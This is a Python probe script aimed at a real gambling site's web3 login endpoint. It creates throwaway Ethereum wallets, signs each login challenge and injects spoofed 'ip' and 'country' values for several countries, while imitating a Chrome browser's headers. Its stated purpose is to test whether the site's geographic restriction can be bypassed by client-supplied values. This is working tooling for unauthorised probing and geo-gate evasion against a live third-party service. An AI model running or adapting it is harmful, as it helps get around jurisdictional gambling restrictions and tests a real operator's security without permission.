#!/usr/bin/env python3
"""probe11: country-claim matrix on /auth/web3 - is the geo gate client-controlled or IP-real?"""
import json
import secrets
import time

import requests
from eth_account import Account
from eth_account.messages import encode_defunct

BASE = "https://duelbits.com"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")


def hdrs(extra=None):
    h = {
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9", "DNT": "1",
        "sec-ch-ua": '"Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin", "Origin": BASE, "Referer": BASE + "/",
    }
    if extra:
        h.update(extra)
    return h


def attempt(cc):
    b = Account.create()
    addr = b.address.lower()
    r = requests.post(BASE + "/auth/web3/message/?publicAddress=" + addr,
                      headers=hdrs(), timeout=20)
    msg = r.json().get("message", "")
    time.sleep(8)
    sig = Account.sign_message(encode_defunct(hexstr=msg.encode("utf-8").hex()),
                               b.key).signature.hex()
    if not sig.startswith("0x"):
        sig = "0x" + sig
    q = f"ip={cc}&country={cc}"
    body = json.dumps({"address": addr, "signature": sig, "ip": cc, "country": cc})
    rr = requests.post(BASE + "/auth/web3?" + q, headers=hdrs({"Content-Type": "application/json"}),
                       data=body, timeout=20)
    print(f"--- claim {cc}: challenge {r.status_code} / auth {rr.status_code} {rr.text[:160]}")
    time.sleep(8)
    return rr.status_code, rr.text[:160]


for cc in ("US", "CA", "BR", "AR", "NL"):
    attempt(cc)
